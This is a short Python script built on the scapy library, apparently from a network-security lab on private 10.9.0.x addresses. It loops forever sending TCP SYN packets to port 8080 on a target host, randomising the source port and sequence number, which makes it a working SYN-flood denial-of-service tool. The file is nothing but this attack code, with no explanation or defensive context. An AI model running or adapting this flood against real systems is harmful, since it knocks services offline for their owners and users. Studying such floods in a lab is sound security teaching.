#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip  = IP(dst="10.9.0.5")
tcp = TCP(dport=8080, flags='S')
pkt = ip/tcp

while True:
    pkt[IP].src    = "10.9.0.1"
    pkt[TCP].sport = getrandbits(16)
    pkt[TCP].seq   = getrandbits(32)
    pkt.show()
    send(pkt, verbose = 0)
